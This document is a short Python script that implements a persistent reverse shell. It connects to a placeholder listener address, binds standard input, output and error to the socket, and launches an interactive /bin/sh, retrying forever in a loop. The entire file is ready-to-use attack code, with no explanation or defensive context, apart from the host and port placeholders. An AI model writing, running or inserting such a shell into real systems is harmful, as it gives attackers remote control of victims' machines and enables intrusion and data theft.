#coding:utf-8

import socket
import subprocess
import os
import sys

LHOST = "YOURLHOST"
LPORT = YOURLPORT

def RunShell(lhost, lport):
    socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        socks.connect((lhost,lport))
        os.dup2(socks.fileno(), 0)
        os.dup2(socks.fileno(), 1)
        os.dup2(socks.fileno(), 2)
        cmd = subprocess.call(['/bin/sh','-i'])
    except socket.error:
        pass


def main():
    while True:
        RunShell(LHOST, LPORT)

main()
